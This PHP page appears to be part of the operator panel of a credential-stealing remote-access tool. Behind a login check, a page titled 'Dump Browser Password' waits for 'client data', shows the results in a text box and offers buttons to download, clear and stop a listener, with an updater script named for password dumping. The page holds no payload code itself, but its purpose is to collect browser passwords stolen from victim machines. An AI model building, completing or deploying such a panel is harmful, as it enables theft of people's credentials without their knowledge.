<?php
session_start();
if(!isset($_SESSION['IAm-logined'])){
	header('location: login.php');
	exit;
}


include "../assets/php/header.php";
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <link href="../assets/css/bootstrap.min.css" rel="stylesheet">
    <link href="../assets/css/style.css" rel="stylesheet">
    <script src="../assets/js/jquery.min.js"></script>

    <title>Dump Browser Password</title>

</head>


<body class="bg-light">

    <!-- header -->
        <?php  echo $header; ?>

    <!-- header end -->

    <div class="mt-2 d-flex justify-content-center ">
        <p id="notif" class="form-control m-1 w-50"> Please Wait for receive Client Data 🕒</p>
    </div>


    <div class="mt-2 d-flex justify-content-center">
        <textarea class="form-control w-50 m-3" placeholder="result ..." id="result" rows="15" ></textarea>
    </div>

    <div class="mt-2 d-flex justify-content-center">
        <button class="btn btn-primary m-2" id="btn-listen">Listener Runing / press to stop</button>
        <button class="btn btn-success m-2" id="btn-save" onclick=saveTextAsFile(result.value,'log.txt')>Download Logs</button>
        <button class="btn btn-warning m-2" id="btn-clear" >Clear Logs</button>
    </div>

</body>

<script src="../assets/js/script.js"></script>
<script src="../assets/js/dump-pass_updater.js"></script>
</html>

